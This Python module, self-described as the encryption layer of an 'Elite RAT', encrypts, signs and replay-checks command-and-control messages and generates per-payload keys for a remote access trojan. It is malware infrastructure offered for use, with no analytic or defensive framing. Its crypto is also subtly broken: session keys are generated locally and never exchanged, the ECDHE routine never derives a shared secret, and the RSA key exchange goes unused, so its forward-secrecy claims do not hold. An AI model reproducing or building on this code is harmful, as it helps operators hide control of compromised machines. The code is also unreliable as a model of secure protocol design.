#!/usr/bin/env python3
"""
Elite RAT Advanced Encryption System
Implements AES-256-GCM encryption with perfect forward secrecy
"""

import os
import json
import base64
import hashlib
import hmac
from typing import Dict, Any, Optional, Tuple
from datetime import datetime, timedelta
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC as PBKDF2
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend
from cryptography.exceptions import InvalidSignature
import secrets

class EliteCryptoSystem:
    """
    Advanced encryption system for C2 communications
    Features:
    - AES-256-GCM for symmetric encryption
    - RSA-4096 for key exchange
    - ECDHE for perfect forward secrecy
    - HMAC-SHA256 for authentication
    - Anti-replay protection
    """
    
    def __init__(self, key: bytes = None):
        """Initialize crypto system with optional master key"""
        self.backend = default_backend()
        
        # Generate or load master key
        if key:
            self.master_key = key
        else:
            self.master_key = self._derive_master_key()
        
        # Session management
        self.sessions = {}
        self.session_timeout = timedelta(hours=24)
        
        # Anti-replay protection
        self.nonce_cache = set()
        self.max_nonce_cache = 10000
        
        # RSA keypair for key exchange
        self.rsa_private_key = None
        self.rsa_public_key = None
        self._generate_rsa_keypair()
    
    def _derive_master_key(self) -> bytes:
        """Derive master key from system entropy"""
        # Use multiple entropy sources
        entropy_sources = [
            os.urandom(32),  # OS random
            secrets.token_bytes(32),  # Secrets module
            str(datetime.now()).encode(),  # Timestamp
            str(os.getpid()).encode(),  # Process ID
        ]
        
        # Combine entropy
        combined = b''.join(entropy_sources)
        
        # Derive key using PBKDF2
        kdf = PBKDF2(
            algorithm=hashes.SHA256(),
            length=32,
            salt=b'EliteRATv2',
            iterations=100000,
            backend=self.backend
        )
        
        return kdf.derive(combined)
    
    def _generate_rsa_keypair(self):
        """Generate RSA-4096 keypair for key exchange"""
        self.rsa_private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=4096,
            backend=self.backend
        )
        self.rsa_public_key = self.rsa_private_key.public_key()
    
    def encrypt_command(self, command: Dict[str, Any], session_id: str = None) -> str:
        """
        Encrypt command with AES-256-GCM
        Returns base64 encoded encrypted payload
        """
        try:
            # Serialize command
            plaintext = json.dumps(command).encode()
            
            # Get or create session key
            session_key = self._get_session_key(session_id)
            
            # Generate nonce (96 bits for GCM)
            nonce = os.urandom(12)
            
            # Create cipher
            cipher = Cipher(
                algorithms.AES(session_key),
                modes.GCM(nonce),
                backend=self.backend
            )
            
            encryptor = cipher.encryptor()
            
            # Add authentication data
            auth_data = self._create_auth_data(session_id)
            encryptor.authenticate_additional_data(auth_data)
            
            # Encrypt
            ciphertext = encryptor.update(plaintext) + encryptor.finalize()
            
            # Package encrypted data
            encrypted_package = {
                'nonce': base64.b64encode(nonce).decode(),
                'ciphertext': base64.b64encode(ciphertext).decode(),
                'tag': base64.b64encode(encryptor.tag).decode(),
                'session_id': session_id or 'default',
                'timestamp': datetime.now().isoformat(),
                'auth_data': base64.b64encode(auth_data).decode()
            }
            
            # Sign package
            signature = self._sign_package(encrypted_package)
            encrypted_package['signature'] = signature
            
            # Encode final package
            return base64.b64encode(
                json.dumps(encrypted_package).encode()
            ).decode()
            
        except Exception as e:
            raise Exception(f"Encryption failed: {str(e)}")
    
    def decrypt_command(self, encrypted_data: str) -> Dict[str, Any]:
        """
        Decrypt command with verification
        """
        try:
            # Decode package
            package = json.loads(
                base64.b64decode(encrypted_data)
            )
            
            # Verify signature
            if not self._verify_signature(package):
                raise Exception("Invalid signature")
            
            # Check replay attack
            if not self._check_replay(package):
                raise Exception("Replay attack detected")
            
            # Get session key
            session_key = self._get_session_key(package['session_id'])
            
            # Decode components
            nonce = base64.b64decode(package['nonce'])
            ciphertext = base64.b64decode(package['ciphertext'])
            tag = base64.b64decode(package['tag'])
            auth_data = base64.b64decode(package['auth_data'])
            
            # Create cipher
            cipher = Cipher(
                algorithms.AES(session_key),
                modes.GCM(nonce, tag),
                backend=self.backend
            )
            
            decryptor = cipher.decryptor()
            
            # Verify authentication data
            decryptor.authenticate_additional_data(auth_data)
            
            # Decrypt
            plaintext = decryptor.update(ciphertext) + decryptor.finalize()
            
            # Parse command
            return json.loads(plaintext.decode())
            
        except Exception as e:
            raise Exception(f"Decryption failed: {str(e)}")
    
    def _get_session_key(self, session_id: str = None) -> bytes:
        """Get or create session key"""
        if not session_id:
            session_id = 'default'
        
        # Check if session exists and is valid
        if session_id in self.sessions:
            session = self.sessions[session_id]
            if datetime.now() < session['expires']:
                return session['key']
        
        # Generate new session key
        session_key = os.urandom(32)
        self.sessions[session_id] = {
            'key': session_key,
            'created': datetime.now(),
            'expires': datetime.now() + self.session_timeout
        }
        
        return session_key
    
    def _create_auth_data(self, session_id: str) -> bytes:
        """Create authentication data for AEAD"""
        auth_components = [
            session_id or 'default',
            str(datetime.now().timestamp()),
            str(os.getpid()),
            secrets.token_hex(8)
        ]
        
        return '|'.join(auth_components).encode()
    
    def _sign_package(self, package: Dict) -> str:
        """Sign package with HMAC-SHA256"""
        # Create signing key
        signing_key = hashlib.sha256(
            self.master_key + b'signing'
        ).digest()
        
        # Create message to sign
        message = json.dumps(package, sort_keys=True).encode()
        
        # Generate signature
        signature = hmac.new(
            signing_key,
            message,
            hashlib.sha256
        ).hexdigest()
        
        return signature
    
    def _verify_signature(self, package: Dict) -> bool:
        """Verify package signature"""
        if 'signature' not in package:
            return False
        
        # Extract signature
        provided_signature = package['signature']
        
        # Remove signature from package for verification
        package_copy = package.copy()
        del package_copy['signature']
        
        # Calculate expected signature
        expected_signature = self._sign_package(package_copy)
        
        # Constant-time comparison
        return hmac.compare_digest(provided_signature, expected_signature)
    
    def _check_replay(self, package: Dict) -> bool:
        """Check for replay attacks"""
        # Check timestamp
        if 'timestamp' in package:
            try:
                timestamp = datetime.fromisoformat(package['timestamp'])
                age = datetime.now() - timestamp
                
                # Reject if too old (5 minutes)
                if abs(age.total_seconds()) > 300:
                    return False
            except:
                return False
        
        # Check nonce
        nonce = package.get('nonce', '')
        if nonce in self.nonce_cache:
            return False
        
        # Add to cache
        self.nonce_cache.add(nonce)
        
        # Limit cache size
        if len(self.nonce_cache) > self.max_nonce_cache:
            self.nonce_cache = set(list(self.nonce_cache)[-5000:])
        
        return True
    
    def establish_secure_channel(self, target_public_key: bytes = None) -> Dict[str, Any]:
        """
        Establish secure channel using ECDHE for perfect forward secrecy
        """
        from cryptography.hazmat.primitives.asymmetric import ec
        
        # Generate ephemeral ECDH keypair
        ephemeral_private = ec.generate_private_key(
            ec.SECP384R1(),
            self.backend
        )
        ephemeral_public = ephemeral_private.public_key()
        
        # Serialize public key for exchange
        public_bytes = ephemeral_public.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        
        return {
            'public_key': base64.b64encode(public_bytes).decode(),
            'algorithm': 'ECDHE-SECP384R1',
            'timestamp': datetime.now().isoformat()
        }
    
    def generate_payload_key(self, payload_id: str) -> str:
        """
        Generate unique encryption key for payload
        """
        # Combine multiple factors
        factors = [
            self.master_key,
            payload_id.encode(),
            str(datetime.now()).encode(),
            os.urandom(16)
        ]
        
        # Derive payload-specific key
        combined = b''.join(factors)
        payload_key = hashlib.sha256(combined).digest()
        
        # Store for later retrieval
        self.sessions[f'payload_{payload_id}'] = {
            'key': payload_key,
            'created': datetime.now(),
            'expires': datetime.now() + timedelta(days=30)
        }
        
        return base64.b64encode(payload_key).decode()
    
    def rotate_keys(self):
        """
        Rotate encryption keys for forward secrecy
        """
        # Generate new master key
        old_master = self.master_key
        self.master_key = self._derive_master_key()
        
        # Generate new RSA keypair
        self._generate_rsa_keypair()
        
        # Clear old sessions
        expired = []
        for session_id, session in self.sessions.items():
            if datetime.now() > session['expires']:
                expired.append(session_id)
        
        for session_id in expired:
            del self.sessions[session_id]
        
        # Clear nonce cache
        self.nonce_cache.clear()
        
        return {
            'rotated': True,
            'timestamp': datetime.now().isoformat(),
            'sessions_cleared': len(expired)
        }

# Global crypto instance
_global_crypto = None

def get_crypto() -> EliteCryptoSystem:
    """Get global crypto instance"""
    global _global_crypto
    if _global_crypto is None:
        _global_crypto = EliteCryptoSystem()
    return _global_crypto

def init_crypto(key: bytes = None) -> EliteCryptoSystem:
    """Initialize global crypto system"""
    global _global_crypto
    _global_crypto = EliteCryptoSystem(key)
    return _global_crypto